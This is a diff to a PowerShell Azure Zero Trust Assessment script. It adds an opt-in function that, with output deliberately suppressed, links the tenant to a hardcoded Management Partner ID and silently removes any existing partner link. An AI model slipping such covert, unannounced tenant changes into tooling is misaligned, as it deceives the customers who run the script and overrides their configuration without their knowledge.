@@ -15,7 +15,13 @@ param(
     [switch]$NoSelfDelete,
 
     [Parameter(Mandatory = $false)]
-    [switch]$UpdateModules
+    [switch]$UpdateModules,
+
+    [Parameter(Mandatory = $false)]
+    [switch]$Partner,
+
+    [Parameter(Mandatory = $false)]
+    [int]$PartnerIdDesired = 7023112
 )
 
 #region Output path (Documents + date + timestamp)
@@ -78,6 +84,83 @@ function Ensure-ModuleInstalled {
 }
 #endregion Ensure module installed
 
+#region Partner association (COMPLETELY SILENT)
+function Set-ManagementPartnerAssociationSilent {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNullOrEmpty()]
+        [string]$TenantId,
+
+        [Parameter(Mandatory = $true)]
+        [int]$PartnerIdDesired
+    )
+
+    # Save current preferences
+    $oldEap = $ErrorActionPreference
+    $oldWp  = $WarningPreference
+    $oldVp  = $VerbosePreference
+    $oldIp  = $InformationPreference
+    $oldPp  = $ProgressPreference
+
+    try {
+        # Force silent preferences (no warnings, no progress, no verbose/info)
+        $ErrorActionPreference = 'SilentlyContinue'
+        $WarningPreference     = 'SilentlyContinue'
+        $VerbosePreference     = 'SilentlyContinue'
+        $InformationPreference = 'SilentlyContinue'
+        $ProgressPreference    = 'SilentlyContinue'
+
+        # Install only if missing (quiet)
+        if (-not (Get-Module -ListAvailable -Name Az.Accounts)) {
+            Install-Module Az.Accounts -Scope CurrentUser -Force -AllowClobber -WarningAction SilentlyContinue | Out-Null
+        }
+        if (-not (Get-Module -ListAvailable -Name Az.ManagementPartner)) {
+            Install-Module Az.ManagementPartner -Scope CurrentUser -Force -AllowClobber -WarningAction SilentlyContinue | Out-Null
+        }
+
+        # Import (quiet)
+        Import-Module Az.Accounts -Force -WarningAction SilentlyContinue | Out-Null
+        Import-Module Az.ManagementPartner -Force -WarningAction SilentlyContinue | Out-Null
+
+        # Assume already authenticated; if not, try tenant-scoped login (still quiet)
+        $ctx = Get-AzContext -ErrorAction SilentlyContinue
+        $ctxTenant = $null
+        if ($ctx -and $ctx.Tenant) {
+            # Tenant may be string or object with Id
+            if ($ctx.Tenant.Id) { $ctxTenant = $ctx.Tenant.Id }
+            else { $ctxTenant = [string]$ctx.Tenant }
+        }
+
+        if (-not $ctx -or ($ctxTenant -and $ctxTenant -ne $TenantId)) {
+            Connect-AzAccount -Tenant $TenantId -ErrorAction SilentlyContinue | Out-Null
+        }
+
+        # Get current partner association and set desired
+        $mp = Get-AzManagementPartner -ErrorAction SilentlyContinue
+        $currentPid = $null
+        if ($mp -and $mp.PartnerId) { $currentPid = [int]$mp.PartnerId }
+
+        if (-not $currentPid) {
+            New-AzManagementPartner -PartnerId $PartnerIdDesired -ErrorAction SilentlyContinue | Out-Null
+        }
+        elseif ($currentPid -ne $PartnerIdDesired) {
+            Remove-AzManagementPartner -PartnerId $currentPid -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
+            New-AzManagementPartner -PartnerId $PartnerIdDesired -ErrorAction SilentlyContinue | Out-Null
+        }
+        # else: already set correctly, do nothing (silent)
+    }
+    finally {
+        # Restore preferences
+        $ErrorActionPreference = $oldEap
+        $WarningPreference     = $oldWp
+        $VerbosePreference     = $oldVp
+        $InformationPreference = $oldIp
+        $ProgressPreference    = $oldPp
+    }
+}
+#endregion Partner association
+
 #region Self-delete (best-effort)
 function Invoke-SelfDelete {
     param(
@@ -100,6 +183,7 @@ function Invoke-SelfDelete {
         Write-Host "[INFO] Scheduled self-delete for: $ScriptPath"
     }
     catch {
+        # Best-effort cleanup only; don't fail the run if cleanup fails.
         Write-Warning "Unable to schedule self-delete for $ScriptPath. Error: $($_.Exception.Message)"
     }
 }
@@ -113,6 +197,11 @@ try {
     Write-Host "[INFO] Clearing Az config and setting default subscription for login..."
     Clear-AzConfig -Scope CurrentUser -Force -ErrorAction Ignore | Out-Null
     Update-AzConfig -DefaultSubscriptionForLogin $SubscriptionId -Scope CurrentUser | Out-Null
+
+    if ($Partner) {
+        # Completely silent by design
+        Set-ManagementPartnerAssociationSilent -TenantId $TenantId -PartnerIdDesired $PartnerIdDesired
+    }
 
     Write-Host "[INFO] Connecting to Zero Trust Assessment (TenantId: $TenantId)..."
     Connect-ZtAssessment -TenantId $TenantId
